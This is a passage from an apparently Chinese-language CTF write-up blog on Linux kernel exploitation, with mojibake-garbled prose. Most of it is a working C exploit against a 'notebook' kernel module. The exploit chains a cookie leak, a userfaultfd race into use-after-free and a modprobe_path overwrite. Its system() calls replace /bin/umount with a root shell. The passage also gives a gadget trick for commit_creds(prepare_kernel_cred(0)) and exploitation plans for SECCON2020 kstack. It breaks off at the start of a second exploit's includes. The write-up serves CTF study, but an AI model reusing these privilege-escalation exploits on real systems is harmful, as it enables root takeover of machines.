class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">char</span> *in_buf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">char</span> *name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    get_mod_base();</span><br><span class="line"></span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line"></span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap0 = *(<span class="keyword">uint64_t</span> *)ret_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap1 = *(<span class="keyword">uint64_t</span> *)(ret_buf+<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    notedel(<span class="number">0</span>);</span><br><span class="line">    notedel(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap0_index,heap1_index;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++)&#123;</span><br><span class="line">        noteadd(i,<span class="number">0x60</span>,name);</span><br><span class="line">        notegift(ret_buf);</span><br><span class="line">        <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)(ret_buf+i*<span class="number">0x10</span>) == heap1)&#123;</span><br><span class="line">            heap1_index = i;</span><br><span class="line">            found +=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)(ret_buf+i*<span class="number">0x10</span>) == heap0)&#123;</span><br><span class="line">            heap0_index = i;</span><br><span class="line">            found +=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(found == <span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] we find it! \n heap0 in index %ld \n heap1 in index %ld \n&quot;</span>,heap0_index,heap1_index);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] now, i : %d\n&quot;</span>,i);</span><br><span class="line">    read_note(ret_buf,heap1_index);</span><br><span class="line">    <span class="keyword">uint64_t</span> magic = *(<span class="keyword">uint64_t</span> *)ret_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> cookie = magic^heap0^heap1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cookie is 0x%lx\n&quot;</span>,cookie);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡æ–°å¼€å§‹</span></span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> uaf_heap_addr = *(<span class="keyword">uint64_t</span> *)(ret_buf);</span><br><span class="line">    <span class="keyword">uint64_t</span> notebook_sub_0x10 = module_base + + <span class="number">0x2500</span> - <span class="number">0x10</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)in_buf = cookie^uaf_heap_addr^notebook_sub_0x10;</span><br><span class="line">    write_note(in_buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(name+<span class="number">0xF0</span>) = cookie^notebook_sub_0x10^<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> fake_index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>( j=<span class="number">1</span>; j &lt; <span class="number">0x10</span> ; j++)&#123;</span><br><span class="line">        noteadd(j,<span class="number">0x60</span>,name);</span><br><span class="line">        notegift(ret_buf);</span><br><span class="line">        <span class="keyword">if</span>(*(<span class="keyword">uint64_t</span> *)(ret_buf+j*<span class="number">0x10</span>) == uaf_heap_addr)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] got it!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(j == <span class="number">0x10</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] reboot, and try again\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// printf(&quot;give you 20s to attach debugger!!!\n&quot;);</span></span><br><span class="line">    <span class="comment">// sleep(20);</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kmalloc uaf object back\n&quot;</span>);</span><br><span class="line">    fake_index = j+<span class="number">1</span>;</span><br><span class="line">    noteadd(fake_index,<span class="number">0x60</span>,name);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// leak kernel base</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(in_buf+<span class="number">0x20</span>) = module_base + <span class="number">0x168</span>;          <span class="comment">// call copy_from_user</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(in_buf+<span class="number">0x28</span>) = <span class="number">0x4</span>;   </span><br><span class="line">    write_note(in_buf,fake_index);</span><br><span class="line">    read_note(ret_buf,<span class="number">1</span>);</span><br><span class="line">    kernel_base = ((*(<span class="keyword">uint32_t</span> *)ret_buf + module_base + <span class="number">0x16c</span>) | <span class="number">0xffffffff00000000</span>) - <span class="number">0x476c30</span>;</span><br><span class="line">    <span class="comment">// è¢«è°ƒç”¨å‡½æ•°å®é™…æ®µåç§»é‡ = ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ + ç›¸å¯¹åç§»é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// change modprobe_path </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] change notebook[0] to point to modprobe_path!\n&quot;</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(in_buf+<span class="number">0x10</span>) = modprobe_addr - bzImage_base + kernel_base;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(in_buf+<span class="number">0x18</span>) = <span class="number">0x8</span>;</span><br><span class="line">    write_note(in_buf,fake_index);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] write notebook[0] to change modprobe_path!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(in_buf,<span class="string">&quot;/tmp/x\x00&quot;</span>,<span class="number">8</span>);</span><br><span class="line">    write_note(in_buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\nexec 0&lt;/dev/console\\nexec 1&gt;/dev/console\\nexec 2&gt;/dev/console\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/x&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/dummy&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/dummy&quot;</span>);</span><br><span class="line">                         </span><br><span class="line">    system(<span class="string">&quot;/tmp/dummy 2&gt;/dev/null&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;ls -l /flag&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h2 id="é—®é¢˜"   >
          <a href="#é—®é¢˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2>
      <ul>
<li><p>é—®é¢˜1ï¼š/initçš„è¾“å‡ºæ— æ³•æ˜¾ç¤ºæ˜¯ä»€ä¹ˆåŸå› ï¼Ÿ</p>
<p>ä¸ºä»€ä¹ˆè¿™ä¸ªé¢˜ï¼Œä½¿ç”¨modprobe_pathæ–¹æ³•æ”¹äº†umountï¼Œä½†exitåä¸èƒ½è·å¾—root shellï¼Ÿï¼Ÿï¼Ÿå› ä¸ºinitè„šæœ¬ä¸­ï¼Œæ²¡æœ‰ä¸‹é¢è¿™ä¸‰è¡Œï¼š</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br></pre></td></tr></table></div></figure>
<p>å¯¼è‡´exité€€å‡ºåï¼Œ<code>/dev/console</code>çš„å†…å®¹æ— æ³•æ˜¾ç¤ºç»™æˆ‘ä»¬ã€‚å¦‚ä¸‹å›¾ï¼Œæ˜¯åœ¨initè„šæœ¬ä¸­å¢åŠ ä»¥ä¸Šä¸‰è¡Œä»£ç çš„ç»“æœã€‚</p>
<p><img   src="image-20230225194548400.png?size=600" style="width: 600px;"  alt="image-20230225194548400"></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.baeldung.com/linux/monitor-keyboard-drivers" >Difference between /dev/console, /dev/tty, and /dev/tty0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>æ‰¾åˆ°æ ¹æœ¬åŸå› åï¼Œä¸€åˆ‡å°±å˜å¾—ç®€å•äº†ã€‚åœ¨æˆ‘ä»¬æ”¹çš„umountæ–‡ä»¶ä¸­ï¼Œ<code>/bin/sh</code>ä¹‹å‰å¢åŠ è¿™ä¸‰è¡Œä»£ç ï¼Œå°±èƒ½è¾¾åˆ°è·å¾—root shellçš„ç›®çš„å•¦ï¼</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;echo &#x27;#!/bin/sh\nrm /bin/umount\necho -e \&quot;#!/bin/sh\\nexec 0&lt;/dev/console\\nexec 1&gt;/dev/console\\nexec 2&gt;/dev/console\\n/bin/sh\\n\&quot; &gt; /bin/umount\nchmod 777 /bin/umount&#x27; &gt; /tmp/x&quot;</span>);</span><br></pre></td></tr></table></div></figure>

</li>
<li><p>é—®é¢˜2ï¼šåœ¨å†…æ ¸æ€æ‰§è¡Œ<code>commit_creds(prepare_kernel_cred(0))</code>æ—¶ï¼Œgadgetä¸å¥½æ‰¾ï¼Œæ€ä¹ˆåŠï¼Ÿ</p>
<p>å¯¹äºæ”¯æŒå¤šæ ¸çš„å†…æ ¸ä¸­ï¼Œæœ‰ä¸€ä¸ª <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.15/source/kernel/workqueue.c#L5170" >work_for_cpu_fn()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> å‡½æ•°ï¼Œå…¶åæ±‡ç¼–åçš„ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">work_for_cpu_fn</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  result = (*(__int64 (__fastcall **)(_QWORD))(a1 + <span class="number">32</span>))(*(_QWORD *)(a1 + <span class="number">40</span>));</span><br><span class="line">  *(_QWORD *)(a1 + <span class="number">48</span>) = result;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>åªè¦æ§åˆ¶å‚æ•°a1ï¼ˆRDIï¼‰æŒ‡å‘å†…å­˜çš„å†…å®¹ï¼Œå³å¯æ‰§è¡Œä¸€ä¸ªå‚æ•°çš„ä»»æ„å‡½æ•°ï¼ˆå¦‚<code>prepare_kernel_cred(0)</code>ï¼‰ï¼Œå¹¶å°†è¿”å›å€¼å†™å…¥å†…å­˜ä¸­ã€‚</p>
</li>
</ul>

        <h1 id="é¢˜ç›®2-SECCON2020-kstack"   >
          <a href="#é¢˜ç›®2-SECCON2020-kstack" class="heading-link"><i class="fas fa-link"></i></a><a href="#é¢˜ç›®2-SECCON2020-kstack" class="headerlink" title="é¢˜ç›®2 - SECCON2020 kstack"></a>é¢˜ç›®2 - SECCON2020 kstack</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=6dFmH_JEF4s" >userfaultfdåˆ©ç”¨æ–¹æ³•è§†é¢‘è®²è§£</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/BrieflyX/ctf-pwns/tree/master/kernel/kstack" >Kstack - Seccon 2020</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266898" >ä» SECCON2020 ä¸€é“ kernel pwn çœ‹ userfaultfd + setxattr â€œå †å ä½â€æŠ€æœ¯</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://roderickchan.github.io/2022/04/28/seccon-2020-kstack/" >seccon-2020-kstack</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ç³»ç»Ÿå¼€å¯KASLRï¼ŒSMEPï¼ŒKPTI</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">âœ  kstack cat start.sh </span><br><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -kernel ./bzImage \</span><br><span class="line">    -initrd ./rootfs.cpio \</span><br><span class="line">    -append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr quiet&quot;</span> \</span><br><span class="line">    -cpu kvm64,+smep \</span><br><span class="line">    -net user -net nic -device e1000 \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -nographic</span><br><span class="line"></span><br><span class="line">$ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Processor vulnerable</span><br><span class="line">Mitigation: PTE Inversion</span><br><span class="line">Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Vulnerable</span><br><span class="line">Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline, STIBP: disabled, RSB filling</span><br><span class="line">Not affected</span><br></pre></td></tr></table></div></figure>



        <h2 id="åˆ†æ-1"   >
          <a href="#åˆ†æ-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2>
      <p>é¢˜ç›®é™„ä»¶ï¼š<a href="kstack.80da39cf379e98884be9c02889575868.tar.gz">kstack.tar.gz</a></p>
<p>å…¨å±€å˜é‡headæœªåŠ é”ï¼Œåœ¨0x57ac001å’Œ0x57ac002ä¸¤ä¸ªåˆ†æ”¯ä¸­éƒ½æœ‰ä½¿ç”¨åˆ°å®ƒï¼Œæ‰€ä»¥å­˜åœ¨æ¡ä»¶ç«äº‰çš„å¯èƒ½ã€‚</p>
<p><img   src="image-20230301002128590.png?size=600" style="width: 600px;"  alt="image-20230301002128590"></p>

        <h2 id="åˆ©ç”¨-1"   >
          <a href="#åˆ©ç”¨-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2>
      <p>æ–¹æ³•1 - <strong>exp1</strong>ï¼š</p>
<ul>
<li><strong>æ¡ä»¶ç«äº‰æ³„éœ²ä¿¡æ¯</strong>ï¼šå¦‚æœåˆ©ç”¨userfaultfdè®©ä¸€ä¸ªçº¿ç¨‹å¡åœ¨copy_from_userï¼Œå¦ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œcopy_to_useråˆ†æ”¯ï¼Œå°±èƒ½æ³„éœ²å †ä¸Šçš„ä¿¡æ¯</li>
<li><strong>æ¡ä»¶ç«äº‰äº§ç”ŸUAF</strong>ï¼šcopy_to_userçº¿ç¨‹æ‰§è¡Œå®Œåï¼Œä¼šfreeæ‰ç¬¬ä¸€ä¸ªçº¿ç¨‹ç”³è¯·çš„å †ï¼Œäºæ˜¯äº§ç”Ÿäº†æ‚¬ç©ºæŒ‡é’ˆã€‚</li>
<li><strong>ç»“æ„ä½“å ç”¨UAFå †å—ï¼Œå®Œæˆæ§åˆ¶æµåŠ«æŒ</strong>ï¼šå¦‚æœä½¿ç”¨æŸä¸ªç»“æ„ä½“å ç”¨åˆšåˆšé‡Šæ”¾çš„å †å—ï¼Œå¹¶åœ¨æ­¤æ—¶æ¢å¤copy_from_userçº¿ç¨‹çš„æ‰§è¡Œï¼Œè®©*argè¦†ç›–ç»“æ„ä½“ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œå°±å¯ä»¥åŠ«æŒæ§åˆ¶æµäº†ã€‚</li>
</ul>
<p>æ–¹æ³•2- <strong>exp2</strong>ï¼š</p>
<ul>
<li><p><strong>æ¡ä»¶ç«äº‰æ³„éœ²ä¿¡æ¯</strong>ï¼šåŒä¸Š</p>
</li>
<li><p><strong>æ¡ä»¶ç«äº‰æ„é€ double free</strong>ï¼šcopy_from_userçº¿ç¨‹å¡ä½ï¼Œèµ·ç¬¬äºŒä¸ªçº¿ç¨‹æ‰§è¡Œåˆ°copy_to_userå¤„å¡ä½ï¼Œæ­¤æ—¶ç¬¬ä¸‰ä¸ªçº¿ç¨‹ä¹Ÿè¿›å…¥copy_to_useré‡Šæ”¾å †å—ï¼Œç„¶åæ”¾è¡Œç¬¬äºŒä¸ªçº¿ç¨‹ï¼Œä¼šå†æ¬¡é‡Šæ”¾å †å—ï¼Œäºæ˜¯äº§ç”Ÿdouble free</p>
</li>
<li><p><strong>â€œsetxattrr+usefaultfdâ€ æ”¹å †å—æŒ‡é’ˆï¼Œè¾¾åˆ°ä»»æ„åœ°å€å†™</strong>ï¼šåŒlibc</p>
</li>
</ul>
<p>æ–¹æ³•3 - <strong>exp3</strong>ï¼š</p>
<ul>
<li><strong>æ¡ä»¶ç«äº‰æ³„éœ²ä¿¡æ¯</strong>ï¼šåŒä¸Š</li>
<li><strong>æ¡ä»¶ç«äº‰æ„é€ double free</strong>ï¼šåŒä¸Š</li>
<li><strong>ç»“æ„ä½“å ç”¨double freeå †å—ï¼Œâ€setxattrr+usefaultfdâ€ æ”¹ç»“æ„ä½“å‡½æ•°æŒ‡é’ˆï¼Œå®Œæˆæ§åˆ¶æµåŠ«æŒ</strong>ï¼šæŸç§ç¨‹åº¦ä¸Šï¼Œå¯ä»¥çœ‹ä½œæ–¹æ³•1å’Œæ–¹æ³•2çš„ç»“åˆã€‚double freeåï¼Œå…ˆmallocå¹¶ç”¨seq_operationså ç”¨UAFå †å—ï¼Œå†mallocä¸€æ¬¡ï¼ˆè¿˜æ˜¯é‚£ä¸ªUAFå †å—ï¼‰å¹¶ä½¿ç”¨â€setxaddr+userfaultfdâ€æ”¹å‡½æ•°æŒ‡é’ˆï¼Œæœ€åé€šè¿‡æ“ä½œseq_operations-&gt;startæ§åˆ¶æµåŠ«æŒ</li>
</ul>

        <h3 id="exp1-1"   >
          <a href="#exp1-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp1-1" class="headerlink" title="exp1"></a>exp1</h3>
      <p>å…·ä½“åšæ³•å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¿¡æ¯æ³„éœ²ï¼š<code>CMD_PUSH</code>åˆ†æ”¯ä¸­ï¼Œç”³è¯·çš„å †å—ä¸ºkmalloc-0x20å¤§å°ã€‚äºæ˜¯é€‰æ‹©å…ˆé€šè¿‡<code> open(&quot;/proc/self/stat&quot;,0);</code>ï¼ˆç”³è¯·0x20å †å—ï¼‰å’Œ<code>close()</code>ï¼ˆé‡Šæ”¾0x20å †å—ï¼‰åœ¨å †ä¸­å–·ä¸Šå‡½æ•°æŒ‡é’ˆï¼Œå†åˆ©ç”¨æœ¬é¢˜çš„æ¼æ´ï¼Œå°±èƒ½ä»copy_to_user()æ³„éœ²å†…æ ¸å‡½æ•°åœ°å€ï¼ˆ<code>single_stop()</code>ï¼‰ç»™ç”¨æˆ·æ€ã€‚</li>
<li>æ§åˆ¶æµåŠ«æŒï¼šåˆ©ç”¨seq_operationsç»“æ„ä½“å ç”¨è¯¥å †å—ï¼Œå¹¶æ§åˆ¶copy_from_userçš„argåœ°å€å¤„çš„å€¼ï¼Œé‚£ä¹ˆå°±èƒ½æ§åˆ¶<code>seq_operations-&gt;stop</code>å‡½æ•°æŒ‡é’ˆã€‚</li>
<li>ææƒï¼šåˆ©ç”¨pt_regsæ‰§è¡ŒROP gadgetå†™modprobe_pathï¼Œå®Œæˆææƒã€‚</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span 